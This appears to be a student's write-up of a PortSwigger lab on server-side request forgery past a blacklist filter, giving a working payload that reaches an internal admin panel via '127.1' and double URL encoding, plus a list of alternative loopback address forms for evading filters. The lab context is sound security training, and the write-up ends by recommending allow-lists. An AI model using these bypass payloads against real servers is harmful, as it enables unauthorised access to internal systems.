// PortSwigger Labs ---> Platform
---
## Lab: 4 — SSRF With Blacklist-Based Input Filter
## Difficulty Level : 🟡 PRACTITIONER

---

### Where I Found Vulnerability?
- **URL:** `/product?productId=3`
- **Parameter:** `stockApi`
- **Defense:** The developer had put in 2 weak anti-SSRF filters — both got bypassed

---

### Steps?
1. Click the Check Stock button and intercept in Burp
2. Change the value of the `stockApi` parameter
3. Direct payloads were blocked — had to bypass the filter
4. Bypassed using `127.0.0.1` → `127.1` (Filter 1 down ✅)
5. The word `admin` was blocked → double URL encoded it (Filter 2 down ✅)
6. Sent the final payload → `/admin` panel opened
7. Deleted Carlos → Lab solved ✅

---

### Working Payloads?

**Blocked (the developer had blocked all of these):**
```
http://localhost/admin       ← "localhost" blocked
http://127.0.0.1/admin      ← "127.0.0.1" blocked
http://127.1/admin           ← "admin" word blocked
```

**Final Working Payload (Double Encoding):**
```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

**Decode breakdown:**
```
%25%36%31 = %61 = a
%25%36%34 = %64 = d
%25%36%64 = %6d = m
%25%36%39 = %69 = i
%25%36%65 = %6e = n
────────────────────
Result     → admin
```

---

### Why it Worked?

**Filter 1 — IP Bypass:**
- The developer had blocked `localhost` and `127.0.0.1`
- But `127.1` is also the same address — it's a short form that the filter didn't catch
- The OS automatically resolves `127.1` → `127.0.0.1`

**Filter 2 — Double Encoding Bypass:**
- The developer had blocked the word `admin`
- Single encode: `admin` → `%61%64%6d%69%6e` → the filter decoded and caught this ❌
- Double encode: `admin` → `%2561%2564%256d%2569%256e` → the filter got fooled ✅
- The server decoded it itself while processing the request → it became `admin`

```
Normal Encode  :  admin → %61%64%6d%69%6e  (Filter catches this)
Double Encode  :  admin → %2561%2564...    (Filter misses this)
                                ↓
                  Server decodes → %61%64... → admin ✅
```

---

### What I Learned?

- **Blacklist = Weak Defense** — attackers can almost always bypass a blacklist
- Alternatives to `127.0.0.1` that filters miss:
```
127.1
127.0.1
0x7f000001      ← Hex
2130706433      ← Decimal
0177.0.0.1      ← Octal
[::1]           ← IPv6
```
- **Double URL Encoding** is a powerful bypass technique when the server decodes input twice
- The developer should use a **whitelist** instead of a blacklist — only allow the allowed domains, block everything else

---

### Blacklist vs Whitelist — Key Difference

| | Blacklist | Whitelist |
|--|-----------|-----------|
| Approach | Block known bad values | Allow only what's permitted |
| Bypassable? | ✅ Almost always | ❌ Very hard |
| Example | Block "localhost", "127.0.0.1" | Allow only "api.example.com" |
| Used in this lab? | ✅ Yes (and bypassed) | ❌ No |
